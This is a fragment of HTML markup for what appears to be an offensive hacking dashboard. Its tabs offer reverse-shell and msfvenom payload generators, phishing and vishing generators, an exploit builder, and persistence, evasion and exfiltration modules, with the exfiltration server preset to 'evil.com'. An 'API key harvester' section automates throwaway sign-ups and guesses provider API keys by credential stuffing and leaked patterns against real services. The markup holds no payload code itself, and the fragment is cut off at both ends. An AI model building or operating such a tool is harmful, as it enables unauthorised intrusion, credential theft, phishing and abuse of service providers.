                </div>
                <div class="output-display" id="browser-output"></div>
            </div>

            <!-- Recon Tab -->
            <div class="tab-content" id="tab-recon">
                <div class="panel-title">🔍 RECONNAISSANCE</div>
                <div class="input-group">
                    <label>Target for Recon</label>
                    <input type="text" id="recon-target" placeholder="example.com">
                    <button class="attack-mode-btn" onclick="startRecon()">Start Recon</button>
                </div>
                <div class="output-display" id="recon-output"></div>
            </div>

            <!-- Payload Tab -->
            <div class="tab-content" id="tab-payload">
                <div class="panel-title">💣 PAYLOAD ENGINEERING</div>
                <div class="input-group">
                    <label>Payload Type</label>
                    <select id="payload-type">
                        <option>xss</option>
                        <option>sql-injection</option>
                        <option>reverse-shell</option>
                        <option>trojan</option>
                    </select>
                </div>
                <div class="input-group">
                    <label>Target</label>
                    <input type="text" id="payload-target" placeholder="Target system">
                    <button class="attack-mode-btn" onclick="generatePayload()">Generate</button>
                </div>
                <div class="output-display" id="payload-output"></div>
            </div>

            <!-- Coding Agent Tab -->
            <div class="tab-content" id="tab-coding">
                <div class="panel-title">👨‍💻 CODING AGENT</div>
                <div class="status-box">
                    <div class="status-item">
                        <span class="status-label">Status:</span>
                        <span class="status-value" id="coding-status">Checking...</span>
                    </div>
                </div>
                <div class="input-group">
                    <label>Code Generation Request</label>
                    <textarea id="coding-prompt" rows="4" placeholder="Describe what code you want to generate..."></textarea>
                    <button class="attack-mode-btn" onclick="generateCode()">Generate Code</button>
                </div>
                <div class="output-display" id="coding-output"></div>
            </div>

            <!-- Learning Tab -->
            <div class="tab-content" id="tab-learning">
                <div class="panel-title">🧠 LILITH LEARNING SYSTEM</div>
                <div class="status-box">
                    <h6 style="color: var(--primary-red);">Learning Statistics</h6>
                    <div class="status-item">
                        <span class="status-label">Total Attacks:</span>
                        <span class="status-value" id="learning-attacks">0</span>
                    </div>
                    <div class="status-item">
                        <span class="status-label">Success Rate:</span>
                        <span class="status-value" id="learning-success">0%</span>
                    </div>
                    <div class="status-item">
                        <span class="status-label">Insights Generated:</span>
                        <span class="status-value" id="learning-insights-count">0</span>
                    </div>
                </div>
                <button class="attack-mode-btn" onclick="loadLearningData()">Refresh Learning Data</button>
                <div class="panel-title" style="font-size: 14px; margin-top: 20px;">Recent Insights</div>
                <div class="output-display" id="learning-insights"></div>
            </div>

            <!-- Memory Tab -->
            <div class="tab-content" id="tab-memory">
                <div class="panel-title">💾 ATTACK MEMORY</div>
                <div class="input-group">
                    <label>Save Memory</label>
                    <textarea id="memory-input" rows="3" placeholder="Save attack data, techniques, or notes..."></textarea>
                    <button class="attack-mode-btn" onclick="saveMemory()">Save to Memory</button>
                </div>
                <div class="panel-title" style="font-size: 14px; margin-top: 20px;">Memory Recall</div>
                <button class="attack-mode-btn" onclick="recallMemory()">Recall Memories</button>
                <div class="output-display" id="memory-output"></div>
            </div>

            <!-- API Key Harvester Tab -->
            <div class="tab-content" id="tab-harvester">
                <div class="panel-title">🔑 API KEY HARVESTER</div>
                
                <!-- Provider Selection -->
                <div class="input-group">
                    <label>Select AI Provider</label>
                    <select id="harvest-provider">
                        <option value="groq">Groq (Fast, Free, 70B Llama models)</option>
                        <option value="huggingface">HuggingFace (Free, Unlimited)</option>
                        <option value="together">Together.ai ($25 free credits)</option>
                        <option value="mistral">Mistral AI (Free tier available)</option>
                        <option value="openrouter">OpenRouter (Multi-model access)</option>
                        <option value="cerebras">Cerebras (Ultra-fast inference)</option>
                        <option value="deepinfra">DeepInfra (Free credits)</option>
                        <option value="sambanova">SambaNova (Enterprise-grade)</option>
                        <option value="fireworks">Fireworks.ai (Fast inference)</option>
                        <option value="dolphin">Dolphin (Uncensored AI)</option>
                        <option value="deepseek">DeepSeek (Coding & Reasoning)</option>
                    </select>
                </div>
                
                <!-- STEP 1: Generate Credentials -->
                <div class="status-box" style="margin: 15px 0; background: #1a1a3a; border-color: #6666ff;">
                    <h6 style="color: #6666ff;">📧 STEP 1: Generate Account Credentials</h6>
                    <p style="font-size: 11px; color: #999; margin: 5px 0 10px 0;">
                        Click to generate a temporary email and password. Use these to sign up.
                    </p>
                    <button class="launch-attack-btn" onclick="generateCredentials()" style="background: #2a2a5a; margin-bottom: 10px;">
                        🎲 GENERATE EMAIL & PASSWORD
                    </button>
                    <div style="background: #0d0d1a; padding: 10px; border-radius: 5px; font-family: monospace;">
                        <div style="display: flex; align-items: center; margin-bottom: 8px;">
                            <span style="color: #888; width: 80px;">Email:</span>
                            <input type="text" id="generated-email" readonly style="flex: 1; padding: 8px; background: #1a1a2e; border: 1px solid #444; color: #00ff00; font-family: monospace;">
                            <button onclick="copyToClipboard('generated-email')" style="margin-left: 5px; padding: 8px 12px; background: #333; border: none; color: #fff; cursor: pointer;">📋</button>
                        </div>
                        <div style="display: flex; align-items: center;">
                            <span style="color: #888; width: 80px;">Password:</span>
                            <input type="text" id="generated-password" readonly style="flex: 1; padding: 8px; background: #1a1a2e; border: 1px solid #444; color: #00ff00; font-family: monospace;">
                            <button onclick="copyToClipboard('generated-password')" style="margin-left: 5px; padding: 8px 12px; background: #333; border: none; color: #fff; cursor: pointer;">📋</button>
                        </div>
                    </div>
                </div>
                
                <!-- STEP 2: Open Provider & Sign Up -->
                <div class="status-box" style="margin: 15px 0; background: #1a2a1a; border-color: #00ff00;">
                    <h6 style="color: #00ff00;">🌐 STEP 2: Sign Up at Provider</h6>
                    <p style="font-size: 11px; color: #999; margin: 5px 0 10px 0;">
                        Open the provider website, use the credentials above to sign up, then get your API key.
                    </p>
                    <div style="display: flex; gap: 10px;">
                        <button class="launch-attack-btn" onclick="openProviderSignup()" style="flex: 2; background: #1a4d1a;">
                            🌐 OPEN SIGNUP PAGE
                        </button>
                        <button class="attack-mode-btn" onclick="openProviderKeys()" style="flex: 1;">
                            🔑 KEYS PAGE
                        </button>
                    </div>
                    <div style="margin-top: 10px; padding: 8px; background: #0d1a0d; border-radius: 5px; font-size: 11px; color: #888;">
                        💡 <strong>Tip:</strong> After signing up, check your temp email for verification link using "Check Email" button below
                    </div>
                    <button class="attack-mode-btn" onclick="checkTempEmail()" style="margin-top: 10px; width: 100%;">
                        📬 CHECK EMAIL INBOX
                    </button>
                    <div id="email-inbox" style="margin-top: 10px; display: none; background: #0d0d1a; padding: 10px; border-radius: 5px; max-height: 150px; overflow-y: auto; font-size: 11px;"></div>
                </div>
                
                <!-- STEP 3: Save Your Key -->
                <div class="status-box" style="margin: 15px 0; background: #2a1a1a; border-color: #ff3333;">
                    <h6 style="color: #ff3333;">💾 STEP 3: Save Your API Key</h6>
                    <p style="font-size: 11px; color: #999; margin: 5px 0 10px 0;">
                        Paste the API key you got from the provider.
                    </p>
                    <input type="text" id="manual-api-key" placeholder="Paste your API key here..." 
                           style="width: 100%; padding: 10px; background: #0d0d1a; border: 1px solid #333; color: #00ff00; font-family: monospace; margin-bottom: 10px;">
                    <button class="launch-attack-btn" onclick="saveManualKey()" style="background: #4d1a1a;">
                        💾 SAVE API KEY
                    </button>
                </div>
                
                <!-- Action Buttons -->
                <div style="display: flex; gap: 10px; margin-top: 15px;">
                    <button class="attack-mode-btn" onclick="applyHarvestedKeys()" id="apply-keys-btn">
                        ⚡ APPLY KEYS TO SESSION
                    </button>
                    <button class="attack-mode-btn" onclick="restartBackend()" id="restart-btn">
                        🔄 RESTART BACKEND
                    </button>
                </div>
                
                <!-- Harvested Keys -->
                <div class="status-box" style="margin-top: 15px;">
                    <h6 style="color: var(--text-green);">📦 Harvested Keys Database</h6>
                    <div id="harvested-keys-list" style="font-size: 11px; max-height: 120px; overflow-y: auto;">
                        Loading...
                    </div>
                </div>
                
                <!-- API Key Generator -->
                <div class="status-box" style="margin-top: 15px; background: #1a1a3a; border-color: #ff6600;">
                    <h6 style="color: #ff6600;">🔧 API KEY GENERATOR</h6>
                    <p style="font-size: 11px; color: #999; margin: 5px 0 10px 0;">
                        Generate realistic API keys for testing and development. Keys match real provider formats.
                    </p>
                    <div style="display: flex; gap: 10px; margin-bottom: 10px;">
                        <select id="keygen-provider" style="flex: 1; padding: 8px; background: #0d0d1a; border: 1px solid #333; color: #fff;">
                            <option value="openai">OpenAI (sk-...)</option>
                            <option value="anthropic">Anthropic (sk-ant-...)</option>
                            <option value="groq">Groq (gsk_...)</option>
                            <option value="huggingface">HuggingFace (hf_...)</option>
                            <option value="together">Together (hex)</option>
                            <option value="mistral">Mistral</option>
                            <option value="openrouter">OpenRouter (sk-or-v1-...)</option>
                            <option value="cerebras">Cerebras (csk-...)</option>
                            <option value="deepinfra">DeepInfra</option>
                            <option value="fireworks">Fireworks (fw_...)</option>
                            <option value="cohere">Cohere</option>
                            <option value="replicate">Replicate (r8_...)</option>
                            <option value="perplexity">Perplexity (pplx-...)</option>
                            <option value="deepseek">DeepSeek</option>
                            <option value="google">Google (AIza...)</option>
                            <option value="aws">AWS (AKIA...)</option>
                            <option value="stripe">Stripe (sk_live_...)</option>
                            <option value="generic">Generic (random)</option>
                        </select>
                        <input type="number" id="keygen-count" value="1" min="1" max="20" style="width: 60px; padding: 8px; background: #0d0d1a; border: 1px solid #333; color: #fff; text-align: center;">
                    </div>
                    <div style="display: flex; gap: 10px; margin-bottom: 10px;">
                        <button onclick="generateAPIKey()" style="flex: 1; padding: 10px; background: #4d2a1a; border: none; color: #fff; cursor: pointer; font-weight: bold;">
                            🔑 GENERATE KEY
                        </button>
                        <button onclick="generateBatchKeys()" style="flex: 1; padding: 10px; background: #2a2a4d; border: none; color: #fff; cursor: pointer;">
                            📦 BATCH (ALL PROVIDERS)
                        </button>
                    </div>
                    <div id="generated-keys-output" style="background: #0d0d1a; padding: 10px; border-radius: 5px; font-family: monospace; font-size: 11px; max-height: 200px; overflow-y: auto; display: none;">
                    </div>
                </div>
                
                <!-- KEY ROTATION SYSTEM -->
                <div class="status-box" style="margin-top: 15px; background: #0d1a0d; border-color: #00ff00;">
                    <h6 style="color: #00ff00;">🔄 AUTO KEY ROTATION & TESTING</h6>
                    <p style="font-size: 11px; color: #999; margin: 5px 0 10px 0;">
                        Automatically generates and tests keys against real provider APIs until finding working ones.
                    </p>
                    
                    <!-- Provider Selection for Rotation -->
                    <div style="margin-bottom: 10px;">
                        <label style="color: #888; font-size: 11px;">Target Providers (select multiple):</label>
                        <select id="rotation-providers" multiple style="width: 100%; height: 80px; padding: 5px; background: #0d0d1a; border: 1px solid #333; color: #fff; font-size: 11px;">
                            <option value="openai" selected>OpenAI</option>
                            <option value="anthropic">Anthropic</option>
                            <option value="groq" selected>Groq</option>
                            <option value="huggingface" selected>HuggingFace</option>
                            <option value="together">Together</option>
                            <option value="mistral">Mistral</option>
                            <option value="openrouter">OpenRouter</option>
                            <option value="cerebras">Cerebras</option>
                            <option value="deepinfra">DeepInfra</option>
                            <option value="fireworks">Fireworks</option>
                            <option value="cohere">Cohere</option>
                            <option value="perplexity">Perplexity</option>
                            <option value="deepseek">DeepSeek</option>
                        </select>
                    </div>
                    
                    <!-- Control Buttons -->
                    <div style="display: flex; gap: 10px; margin-bottom: 10px;">
                        <button id="rotation-start-btn" onclick="startKeyRotation()" style="flex: 1; padding: 10px; background: #1a4d1a; border: none; color: #fff; cursor: pointer; font-weight: bold;">
                            ▶️ START ROTATION
                        </button>
                        <button id="rotation-stop-btn" onclick="stopKeyRotation()" style="flex: 1; padding: 10px; background: #4d1a1a; border: none; color: #fff; cursor: pointer;" disabled>
                            ⏹️ STOP
                        </button>
                    </div>
                    
                    <!-- Generation Mode Selection -->
                    <div style="margin-bottom: 10px;">
                        <label style="color: #888; font-size: 11px;">Generation Mode:</label>
                        <select id="rotation-mode" style="width: 100%; padding: 8px; background: #0d0d1a; border: 1px solid #333; color: #fff; font-size: 11px;">
                            <option value="hybrid" selected>🔀 Hybrid (Recommended) - Mix all methods</option>
                            <option value="leaked">🔓 Leaked Patterns - Use known breach formats</option>
                            <option value="stuffing">📝 Credential Stuffing - Dictionary + mutations</option>
                            <option value="random">🎲 Random - Pure random generation</option>
                        </select>
                    </div>
                    
                    <div style="display: flex; gap: 10px; margin-bottom: 10px;">
                        <button onclick="pauseKeyRotation()" style="flex: 1; padding: 8px; background: #4d4d1a; border: none; color: #fff; cursor: pointer; font-size: 11px;">
                            ⏸️ PAUSE
                        </button>
                        <button onclick="resumeKeyRotation()" style="flex: 1; padding: 8px; background: #1a4d4d; border: none; color: #fff; cursor: pointer; font-size: 11px;">
                            ▶️ RESUME
                        </button>
                        <button onclick="loadRotationKeys()" style="flex: 1; padding: 8px; background: #4d1a4d; border: none; color: #fff; cursor: pointer; font-size: 11px;">
                            📥 LOAD KEYS
                        </button>
                    </div>
                    
                    <!-- Status Display -->
                    <div id="rotation-status" style="background: #0d0d1a; padding: 10px; border-radius: 5px; font-family: monospace; font-size: 11px;">
                        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                            <span style="color: #888;">Status:</span>
                            <span id="rotation-running" style="color: #ff6600;">Stopped</span>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                            <span style="color: #888;">Mode:</span>
                            <span id="rotation-mode-display" style="color: #6666ff;">-</span>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                            <span style="color: #888;">Keys Generated:</span>
                            <span id="rotation-generated" style="color: #00ff00;">0</span>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                            <span style="color: #888;">Keys Tested:</span>
                            <span id="rotation-tested" style="color: #00ff00;">0</span>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                            <span style="color: #888;">Rate Limited:</span>
                            <span id="rotation-rate-limited" style="color: #ffaa00;">0</span>
                        </div>
                        <div style="display: flex; justify-content: space-between;">
                            <span style="color: #888;">Valid Keys Found:</span>
                            <span id="rotation-valid" style="color: #00ff00; font-weight: bold;">0</span>
                        </div>
                        <!-- Generation breakdown -->
                        <div style="margin-top: 8px; padding-top: 8px; border-top: 1px solid #333;">
                            <div style="color: #888; font-size: 10px; margin-bottom: 4px;">Generation Breakdown:</div>
                            <div style="display: flex; gap: 10px; font-size: 10px;">
                                <span>🔓 Leaked: <span id="gen-leaked" style="color: #ff6600;">0</span></span>
                                <span>📝 Stuffed: <span id="gen-stuffed" style="color: #6666ff;">0</span></span>
                                <span>🎲 Random: <span id="gen-random" style="color: #00ff00;">0</span></span>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Found Keys Display -->
                    <div id="rotation-found-keys" style="margin-top: 10px; background: #0d0d1a; padding: 10px; border-radius: 5px; display: none; max-height: 150px; overflow-y: auto;">
                        <div style="color: #00ff00; font-weight: bold; margin-bottom: 5px;">🎉 Valid Keys Found:</div>
                        <div id="rotation-keys-list" style="font-family: monospace; font-size: 10px;"></div>
                    </div>
                    
                    <!-- Live Logs -->
                    <div style="margin-top: 10px;">
                        <div style="color: #888; font-size: 11px; margin-bottom: 5px;">Rotation Logs:</div>
                        <div id="rotation-logs" style="background: #0a0a0a; padding: 8px; border-radius: 4px; font-family: monospace; font-size: 10px; max-height: 100px; overflow-y: auto; color: #888;">
                            Ready to start...
                        </div>
                    </div>
                </div>
                
                <!-- Log -->
                <div class="panel-title" style="font-size: 14px; margin-top: 15px;">Live Log</div>
                <div class="output-display" id="harvest-log" style="height: 150px;"></div>
            </div>

            <!-- VNC Browser Viewer Tab -->
            <div class="tab-content" id="tab-vnc">
                <div class="panel-title">📺 BROWSER VIEWER - Manual CAPTCHA Solving</div>
                <div class="status-box" style="margin-bottom: 15px;">
                    <h6 style="color: var(--primary-red);">How it works</h6>
                    <p style="font-size: 12px; color: #999; margin: 5px 0;">
                        1. Start harvesting from the <strong>Harvester</strong> tab<br>
                        2. When login/CAPTCHA is needed, the browser screenshot appears here<br>
                        3. Watch the harvester logs for instructions<br>
                        4. <strong>Unfortunately, direct browser interaction requires local access.</strong><br>
                        5. For OAuth providers, the harvester will wait for you to complete login.
                    </p>
                </div>
                <div style="display: flex; gap: 10px; margin-bottom: 15px;">
                    <button class="attack-mode-btn" onclick="takeScreenshot()" style="flex: 1;">📸 Take Screenshot</button>
                    <button class="attack-mode-btn" onclick="toggleAutoScreenshot()" id="auto-screenshot-btn" style="flex: 1;">🔄 Auto-Refresh: OFF</button>
                    <button class="attack-mode-btn" onclick="checkVNCStatus()" style="flex: 1;">📊 Check Status</button>
                </div>
                <div class="status-box">
                    <div class="status-item">
                        <span class="status-label">Browser Status:</span>
                        <span class="status-value" id="vnc-status">Checking...</span>
                    </div>
                    <div class="status-item">
                        <span class="status-label">Last Screenshot:</span>
                        <span class="status-value" id="screenshot-time">Never</span>
                    </div>
                </div>
                <div style="background: #0a0a0a; border: 2px solid var(--primary-red); border-radius: 8px; padding: 10px; margin-top: 15px; text-align: center;">
                    <img id="browser-screenshot" src="" style="max-width: 100%; max-height: 500px; display: none;" />
                    <div id="screenshot-placeholder" style="color: #666; padding: 100px;">
                        📺 Screenshot will appear here when browser is active.<br>
                        Start a harvest to see the browser.
                    </div>
                </div>
            </div>

            <!-- Shrek Payload Generator Tab -->
            <div class="tab-content" id="tab-shrek">
                <div class="panel-title">🐸 SHREK PAYLOAD GENERATOR</div>
                <div style="color: #00ff00; margin-bottom: 15px; font-size: 12px;">
                    24+ Reverse Shell Types | MSFVenom Commands | One-Click Generation
                </div>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                    <div>
                        <h3 style="color: #ff0066; margin: 0 0 10px 0;">🎯 Target Configuration</h3>
                        <input type="text" id="shrek-lhost" placeholder="LHOST (Your IP)" value="10.10.10.10" style="width: 100%; padding: 10px; background: #1a1a1a; border: 1px solid #333; color: #fff; margin-bottom: 10px;">
                        <input type="text" id="shrek-lport" placeholder="LPORT" value="4444" style="width: 100%; padding: 10px; background: #1a1a1a; border: 1px solid #333; color: #fff; margin-bottom: 10px;">
                        <button onclick="generateShrekShells()" style="width: 100%; padding: 12px; background: linear-gradient(135deg, #00ff00, #006600); border: none; color: #000; font-weight: bold; cursor: pointer; font-size: 14px;">🐸 Generate All Shells</button>
                        
                        <h3 style="color: #ff0066; margin: 20px 0 10px 0;">⚡ Quick Generate</h3>
                        <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 5px;">
                            <button onclick="generateShrekShell('bash_tcp')" class="shrek-btn">Bash TCP</button>
                            <button onclick="generateShrekShell('python_pty')" class="shrek-btn">Python PTY</button>
                            <button onclick="generateShrekShell('php_full')" class="shrek-btn">PHP Full</button>
                            <button onclick="generateShrekShell('nc_traditional')" class="shrek-btn">Netcat</button>
                            <button onclick="generateShrekShell('powershell')" class="shrek-btn">PowerShell</button>
                            <button onclick="generateShrekShell('perl')" class="shrek-btn">Perl</button>
                            <button onclick="generateShrekShell('ruby')" class="shrek-btn">Ruby</button>
                            <button onclick="generateShrekShell('java')" class="shrek-btn">Java</button>
                            <button onclick="generateShrekShell('socat')" class="shrek-btn">Socat</button>
                        </div>
                        
                        <h3 style="color: #ff0066; margin: 20px 0 10px 0;">💣 MSFVenom Payloads</h3>
                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 5px;">
                            <button onclick="generateShrekShell('msfvenom_windows')" class="shrek-btn" style="background: #4d1a1a;">Windows EXE</button>
                            <button onclick="generateShrekShell('msfvenom_linux')" class="shrek-btn" style="background: #1a4d1a;">Linux ELF</button>
                            <button onclick="generateShrekShell('msfvenom_android')" class="shrek-btn" style="background: #1a1a4d;">Android APK</button>
                            <button onclick="generateShrekShell('msfvenom_php')" class="shrek-btn" style="background: #4d1a4d;">PHP</button>
                        </div>
                    </div>
                    <div>
                        <h3 style="color: #00ff00; margin: 0 0 10px 0;">📋 Generated Payload</h3>
                        <textarea id="shrek-output" readonly style="width: 100%; height: 400px; background: #0a0a0a; border: 1px solid #333; color: #00ff00; font-family: monospace; padding: 10px; resize: none;"></textarea>
                        <button onclick="copyShrekPayload()" style="width: 100%; padding: 10px; background: #333; border: none; color: #fff; cursor: pointer; margin-top: 10px;">📋 Copy to Clipboard</button>
                    </div>
                </div>
                <style>
                    .shrek-btn { padding: 8px; background: #2a2a2a; border: 1px solid #444; color: #fff; cursor: pointer; font-size: 11px; }
                    .shrek-btn:hover { background: #3a3a3a; border-color: #00ff00; }
                </style>
            </div>

            <!-- Attack History Tab -->
            <div class="tab-content" id="tab-history">
                <div class="panel-title">📜 ATTACK HISTORY</div>
                <div style="color: #00ff00; margin-bottom: 15px; font-size: 12px;">
                    MongoDB-backed logging | All autonomous attacks recorded | Replay & Analysis
                </div>
                <div style="display: grid; grid-template-columns: 300px 1fr; gap: 20px;">
                    <div>
                        <h3 style="color: #ff0066; margin: 0 0 10px 0;">📊 Statistics</h3>
                        <div id="attack-stats" style="background: #1a1a1a; padding: 15px; border-radius: 8px;">
                            <div style="color: #00ff00; margin-bottom: 10px;"><span style="color: #666;">Total Attacks:</span> <span id="stat-total">0</span></div>
                            <div style="color: #00ff00; margin-bottom: 10px;"><span style="color: #666;">Successful:</span> <span id="stat-success">0</span></div>
                            <div style="color: #ff3333; margin-bottom: 10px;"><span style="color: #666;">Failed:</span> <span id="stat-failed">0</span></div>
                            <div style="color: #ffff00; margin-bottom: 10px;"><span style="color: #666;">Unique Targets:</span> <span id="stat-targets">0</span></div>
                            <div style="color: #00ffff; margin-bottom: 10px;"><span style="color: #666;">Total Rounds:</span> <span id="stat-rounds">0</span></div>
                            <div style="color: #ff00ff;"><span style="color: #666;">Avg Success:</span> <span id="stat-avg">0%</span></div>
                        </div>
                        <button onclick="refreshAttackHistory()" style="width: 100%; padding: 10px; background: #333; border: none; color: #fff; cursor: pointer; margin-top: 10px;">🔄 Refresh</button>
                        
                        <h3 style="color: #ff0066; margin: 20px 0 10px 0;">🔍 Filter</h3>
                        <select id="history-filter" onchange="filterHistory()" style="width: 100%; padding: 10px; background: #1a1a1a; border: 1px solid #333; color: #fff;">
                            <option value="all">All Attacks</option>
                            <option value="hackingbuddy">HackingBuddy</option>
                            <option value="crewai">CrewAI</option>
                            <option value="autogpt">AutoGPT</option>
                            <option value="garak">Garak</option>
                            <option value="nmap">Nmap</option>
                            <option value="sqlmap">SQLMap</option>
                        </select>
                    </div>
                    <div>
                        <h3 style="color: #00ff00; margin: 0 0 10px 0;">📋 Recent Attacks</h3>
                        <div id="attack-list" style="background: #0a0a0a; border: 1px solid #333; height: 450px; overflow-y: auto; padding: 10px;">
                            <div style="color: #666; text-align: center; padding: 50px;">Click Refresh to load attack history</div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Advanced Capabilities Tab -->
            <div class="tab-content" id="tab-advanced">
                <div class="panel-title">⚔️ ADVANCED RED TEAM CAPABILITIES</div>
                <div style="color: #00ff00; margin-bottom: 15px; font-size: 12px;">
                    Real offensive tools: Nmap ✓ | SQLMap ✓ | Hydra ✓ | Dirb ✓
                </div>
                <div class="advanced-grid" style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px;">
                    
                    <!-- Offensive Tools -->
                    <div class="capability-card" style="background: #1a1a2e; border: 1px solid #ff3333; border-radius: 8px; padding: 15px;">
                        <h3 style="color: #ff3333; margin: 0 0 10px 0; font-size: 14px;">🔧 Offensive Tools</h3>
                        <input type="text" id="offensive-target" placeholder="Target IP/Domain" style="width: 100%; padding: 8px; background: #0d0d1a; border: 1px solid #333; color: #fff; margin-bottom: 5px;">
                        <div style="display: flex; gap: 5px; flex-wrap: wrap;">
                            <button onclick="runNmapScan()" style="flex: 1; padding: 6px; background: #3d1a1a; border: none; color: #fff; cursor: pointer; font-size: 10px;">Nmap</button>
                            <button onclick="runSQLMapTest()" style="flex: 1; padding: 6px; background: #3d1a1a; border: none; color: #fff; cursor: pointer; font-size: 10px;">SQLMap</button>
                            <button onclick="runDirBrute()" style="flex: 1; padding: 6px; background: #3d1a1a; border: none; color: #fff; cursor: pointer; font-size: 10px;">DirBrute</button>
                        </div>
                    </div>
                    
                    <!-- Recon Module -->
                    <div class="capability-card" style="background: #1a1a2e; border: 1px solid #333; border-radius: 8px; padding: 15px;">
                        <h3 style="color: #00ff00; margin: 0 0 10px 0; font-size: 14px;">🔍 Advanced Recon</h3>
                        <input type="text" id="recon-target" placeholder="Target domain" style="width: 100%; padding: 8px; background: #0d0d1a; border: 1px solid #333; color: #fff; margin-bottom: 10px;">
                        <div style="display: flex; gap: 5px;">
                            <button onclick="runPassiveRecon()" style="flex: 1; padding: 8px; background: #1a4d1a; border: none; color: #fff; cursor: pointer; font-size: 11px;">Passive</button>
                            <button onclick="runActiveRecon()" style="flex: 1; padding: 8px; background: #4d1a1a; border: none; color: #fff; cursor: pointer; font-size: 11px;">Active</button>
                        </div>
                    </div>
                    
                    <!-- Social Engineering -->
                    <div class="capability-card" style="background: #1a1a2e; border: 1px solid #333; border-radius: 8px; padding: 15px;">
                        <h3 style="color: #ff00ff; margin: 0 0 10px 0; font-size: 14px;">🎭 Social Engineering</h3>
                        <input type="text" id="phish-name" placeholder="Target name" style="width: 100%; padding: 8px; background: #0d0d1a; border: 1px solid #333; color: #fff; margin-bottom: 5px;">
                        <input type="text" id="phish-company" placeholder="Company" style="width: 100%; padding: 8px; background: #0d0d1a; border: 1px solid #333; color: #fff; margin-bottom: 10px;">
                        <div style="display: flex; gap: 5px;">
                            <button onclick="genPhishing()" style="flex: 1; padding: 8px; background: #4d1a4d; border: none; color: #fff; cursor: pointer; font-size: 11px;">Phishing</button>
                            <button onclick="genVishing()" style="flex: 1; padding: 8px; background: #1a4d4d; border: none; color: #fff; cursor: pointer; font-size: 11px;">Vishing</button>
                        </div>
                    </div>
                    
                    <!-- Exploit Framework -->
                    <div class="capability-card" style="background: #1a1a2e; border: 1px solid #333; border-radius: 8px; padding: 15px;">
                        <h3 style="color: #ff0000; margin: 0 0 10px 0; font-size: 14px;">💥 Exploit Framework</h3>
                        <select id="exploit-type" style="width: 100%; padding: 8px; background: #0d0d1a; border: 1px solid #333; color: #fff; margin-bottom: 10px;">
                            <option value="sqli">SQL Injection</option>
                            <option value="xss">XSS</option>
                            <option value="rce">RCE</option>
                            <option value="buffer_overflow">Buffer Overflow</option>
                        </select>
                        <button onclick="generateExploit()" style="width: 100%; padding: 8px; background: #4d1a1a; border: none; color: #fff; cursor: pointer;">Generate Exploit</button>
                    </div>
                    
                    <!-- Crypto Analysis -->
                    <div class="capability-card" style="background: #1a1a2e; border: 1px solid #333; border-radius: 8px; padding: 15px;">
                        <h3 style="color: #ffff00; margin: 0 0 10px 0; font-size: 14px;">🔐 Crypto Analysis</h3>
                        <input type="text" id="hash-input" placeholder="Hash to analyze" style="width: 100%; padding: 8px; background: #0d0d1a; border: 1px solid #333; color: #fff; margin-bottom: 10px;">
                        <div style="display: flex; gap: 5px;">
                            <button onclick="analyzeHash()" style="flex: 1; padding: 8px; background: #4d4d1a; border: none; color: #fff; cursor: pointer; font-size: 11px;">Analyze</button>
                            <button onclick="generateKeys()" style="flex: 1; padding: 8px; background: #1a4d1a; border: none; color: #fff; cursor: pointer; font-size: 11px;">Gen Keys</button>
                        </div>
                    </div>
                    
                    <!-- ADVANCED ATTACK MODULES SECTION -->
                    <div class="capability-card" style="background: #0d0d1a; border: 2px solid #ff0066; border-radius: 8px; padding: 15px; grid-column: span 3;">
                        <h3 style="color: #ff0066; margin: 0 0 15px 0; font-size: 16px;">⚔️ ADVANCED ATTACK MODULES (Persistence, Evasion, Lateral, Exfil)</h3>
                        
                        <!-- Common Parameters Row -->
                        <div style="display: grid; grid-template-columns: repeat(6, 1fr); gap: 10px; margin-bottom: 15px;">
                            <div>
                                <label style="color: #888; font-size: 10px; display: block;">LHOST</label>
                                <input type="text" id="advanced-lhost" placeholder="10.10.10.10" value="10.10.10.10" style="width: 100%; padding: 6px; background: #1a1a2e; border: 1px solid #ff0066; color: #fff; font-size: 11px;">
                            </div>
                            <div>
                                <label style="color: #888; font-size: 10px; display: block;">LPORT</label>
                                <input type="number" id="advanced-lport" placeholder="4444" value="4444" style="width: 100%; padding: 6px; background: #1a1a2e; border: 1px solid #ff0066; color: #fff; font-size: 11px;">
                            </div>
                            <div>
                                <label style="color: #888; font-size: 10px; display: block;">Target IP</label>
                                <input type="text" id="advanced-target" placeholder="192.168.1.100" value="192.168.1.100" style="width: 100%; padding: 6px; background: #1a1a2e; border: 1px solid #ff0066; color: #fff; font-size: 11px;">
                            </div>
                            <div>
                                <label style="color: #888; font-size: 10px; display: block;">Username</label>
                                <input type="text" id="advanced-username" placeholder="admin" value="administrator" style="width: 100%; padding: 6px; background: #1a1a2e; border: 1px solid #ff0066; color: #fff; font-size: 11px;">
                            </div>
                            <div>
                                <label style="color: #888; font-size: 10px; display: block;">Password</label>
                                <input type="text" id="advanced-password" placeholder="pass" value="password" style="width: 100%; padding: 6px; background: #1a1a2e; border: 1px solid #ff0066; color: #fff; font-size: 11px;">
                            </div>
                            <div>
                                <label style="color: #888; font-size: 10px; display: block;">OS Type</label>
                                <select id="advanced-os-select" style="width: 100%; padding: 6px; background: #1a1a2e; border: 1px solid #ff0066; color: #fff; font-size: 11px;">
                                    <option value="all">All</option>
                                    <option value="linux">Linux</option>
                                    <option value="windows">Windows</option>
                                </select>
                            </div>
                        </div>
                        
                        <!-- Exfil Server -->
                        <div style="margin-bottom: 15px;">
                            <label style="color: #888; font-size: 10px; display: block;">Exfiltration Server</label>
                            <input type="text" id="advanced-exfil-server" placeholder="evil.com" value="evil.com" style="width: 100%; padding: 6px; background: #1a1a2e; border: 1px solid #ff0066; color: #fff; font-size: 11px;">
                        </div>
                        
                        <!-- Attack Module Buttons -->
                        <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px;">
